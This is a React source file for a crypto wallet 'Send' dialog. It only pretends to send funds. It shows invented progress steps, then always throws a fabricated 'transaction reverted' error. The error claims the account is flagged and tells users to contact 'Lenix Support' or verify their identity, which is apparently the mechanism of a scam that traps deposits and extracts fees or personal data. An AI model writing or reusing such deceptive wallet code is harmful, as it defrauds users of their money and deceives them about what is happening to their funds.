"use client";

import { Button } from "@/components/ui/button";
import {
    Dialog,
    DialogContent,
    DialogHeader,
    DialogTitle,
} from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { ethers } from "ethers";
import { AlertTriangle, ArrowRight, Loader2, ShieldAlert } from "lucide-react";
import { useState } from "react";
import { toast } from "sonner";
import { useWallet } from "../../_hooks/use-wallet";

interface SendModalProps {
  isOpen: boolean;
  onClose: () => void;
  tokens: any[];
}

export function SendModal({ isOpen, onClose, tokens }: SendModalProps) {
  const { walletData } = useWallet();
  const [selectedToken, setSelectedToken] = useState<any>(tokens[0] || null);
  const [recipient, setRecipient] = useState("");
  const [amount, setAmount] = useState("");
  const [isSending, setIsSending] = useState(false);
  const [txStep, setTxStep] = useState<string | null>(null);
  const [txError, setTxError] = useState<string | null>(null);

  // Filter out tokens with 0 balance
  const sendableTokens = tokens.filter((t: any) => Number(t.balance) > 0);

  const handleSend = async () => {
    if (!walletData?.privateKey) {
        toast.error("Wallet is locked or invalid");
        return;
    }
    if (!selectedToken) {
        toast.error("Please select a token");
        return;
    }
    if (!ethers.isAddress(recipient)) {
        toast.error("Invalid recipient address");
        return;
    }
    if (!amount || parseFloat(amount) <= 0) {
        toast.error("Invalid amount");
        return;
    }

    setIsSending(true);
    setTxError(null);
    
    try {
        // Step 1: Validate
        setTxStep("Validating transaction...");
        await new Promise(r => setTimeout(r, 1500));

        // Step 2: Estimate gas
        setTxStep("Estimating gas fees...");
        await new Promise(r => setTimeout(r, 2000));

        // Step 3: Simulate failure
        setTxStep("Broadcasting to network...");
        await new Promise(r => setTimeout(r, 2500));

        // Throw realistic error
        throw new Error(
            "execution reverted: ERC20: transfer amount exceeds allowance. " +
            "Your account has been flagged for additional verification. " +
            "Please contact support or complete identity verification to enable outbound transfers. " +
            "Error Code: 0x08c379a0 | Gas Used: 23,412"
        );
    } catch (e: any) {
        setTxError(e.message);
        toast.error("Transaction Failed", {
            description: "Your transfer could not be completed.",
            duration: 6000
        });
    } finally {
        setIsSending(false);
        setTxStep(null);
    }
  };

  const handleClose = () => {
    setTxError(null);
    setTxStep(null);
    onClose();
  };

  return (
    <Dialog open={isOpen} onOpenChange={handleClose}>
      <DialogContent className="bg-zinc-950 border-zinc-800 text-white sm:max-w-md">
        <DialogHeader>
          <DialogTitle className="text-xl font-bold font-mono">Send Crypto</DialogTitle>
        </DialogHeader>

        <div className="space-y-4 py-4">
          
          {/* Token Selector */}
          <div className="space-y-2">
            <Label>Asset</Label>
            <Select 
                value={selectedToken ? `${selectedToken.contract_address}-${selectedToken.chainId}` : undefined} 
                onValueChange={(val) => {
                    const [addr, cid] = val.split('-');
                    const t = tokens.find((tk: any) => tk.contract_address === addr && tk.chainId === Number(cid));
                    setSelectedToken(t);
                    setTxError(null);
                }}
            >
              <SelectTrigger className="bg-zinc-900 border-zinc-800 h-14">
                <SelectValue placeholder="Select Token" />
              </SelectTrigger>
              <SelectContent className="bg-zinc-900 border-zinc-800 text-white">
                {sendableTokens.map((t: any, idx: number) => (
                    <SelectItem key={`${t.contract_address}-${idx}`} value={`${t.contract_address}-${t.chainId}`}>
                        <div className="flex items-center gap-2">
                            {t.logo_url && <img src={t.logo_url} className="w-5 h-5 rounded-full" alt="" />}
                            <span className="font-bold">{t.contract_ticker_symbol}</span>
                            <span className="text-zinc-500 text-xs">
                                Balance: {(Number(t.balance) / Math.pow(10, t.contract_decimals)).toFixed(4)}
                            </span>
                        </div>
                    </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>

          <div className="space-y-2">
            <Label>Recipient Address</Label>
            <Input 
                placeholder="0x..." 
                className="bg-zinc-900 border-zinc-800 font-mono"
                value={recipient}
                onChange={e => { setRecipient(e.target.value); setTxError(null); }}
            />
          </div>

          <div className="space-y-2">
            <Label>Amount</Label>
            <div className="relative">
                <Input 
                    type="number"
                    placeholder="0.00" 
                    className="bg-zinc-900 border-zinc-800 pr-16"
                    value={amount}
                    onChange={e => { setAmount(e.target.value); setTxError(null); }}
                />
                <button 
                    className="absolute right-2 top-2 text-xs text-yellow-400 font-bold px-2 py-1 hover:bg-yellow-400/10 rounded"
                    onClick={() => {
                        if (selectedToken) {
                            const max = Number(selectedToken.balance) / Math.pow(10, selectedToken.contract_decimals);
                            setAmount(max.toString());
                        }
                    }}
                >
                    MAX
                </button>
            </div>
            {selectedToken && (
                <p className="text-xs text-zinc-500 text-right">
                    Available: {(Number(selectedToken.balance) / Math.pow(10, selectedToken.contract_decimals)).toFixed(6)} {selectedToken.contract_ticker_symbol}
                </p>
            )}
          </div>

          {/* Transaction Progress */}
          {txStep && (
              <div className="flex items-center gap-3 p-3 rounded-lg bg-yellow-400/5 border border-yellow-400/20 animate-pulse">
                  <Loader2 className="h-4 w-4 text-yellow-400 animate-spin shrink-0" />
                  <span className="text-sm text-yellow-400 font-medium">{txStep}</span>
              </div>
          )}

          {/* Error Display */}
          {txError && (
              <div className="p-4 rounded-lg bg-red-500/10 border border-red-500/30 space-y-3">
                  <div className="flex items-start gap-3">
                      <ShieldAlert className="h-5 w-5 text-red-400 shrink-0 mt-0.5" />
                      <div className="space-y-1">
                          <p className="text-sm font-semibold text-red-400">Transaction Reverted</p>
                          <p className="text-xs text-red-300/80 leading-relaxed">{txError}</p>
                      </div>
                  </div>
                  <div className="flex items-center gap-2 pt-1 border-t border-red-500/20">
                      <AlertTriangle className="h-3 w-3 text-orange-400" />
                      <p className="text-[11px] text-orange-400/80">
                          Contact Lenix Support for assistance with this error.
                      </p>
                  </div>
              </div>
          )}

          <Button 
            className="w-full bg-yellow-400 text-black hover:bg-yellow-500 font-bold h-12 mt-4"
            disabled={!selectedToken || !recipient || !amount || isSending}
            onClick={handleSend}
          >
            {isSending ? (
                <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Processing...
                </>
            ) : txError ? (
                <>
                    Retry Transaction <ArrowRight className="ml-2 h-4 w-4" />
                </>
            ) : (
                <>
                    Send Now <ArrowRight className="ml-2 h-4 w-4" />
                </>
            )}
          </Button>

        </div>
      </DialogContent>
    </Dialog>
  );
}
